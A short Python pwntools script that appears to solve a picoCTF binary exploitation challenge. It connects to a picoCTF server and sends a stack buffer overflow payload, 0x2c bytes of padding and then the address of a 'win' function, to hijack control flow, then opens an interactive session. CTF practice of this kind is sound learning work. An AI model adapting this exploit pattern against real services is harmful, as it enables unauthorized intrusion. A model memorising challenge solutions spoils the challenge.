from pwn import *

r = remote("dolphin-cove.picoctf.net" , 50469)


r.recvuntil(b"Enter the secret key: ")

win_addr = 0x08049276

payload = b"a"*(0x28+0x4) + p32(win_addr)

r.sendline(payload)

r.interactive()
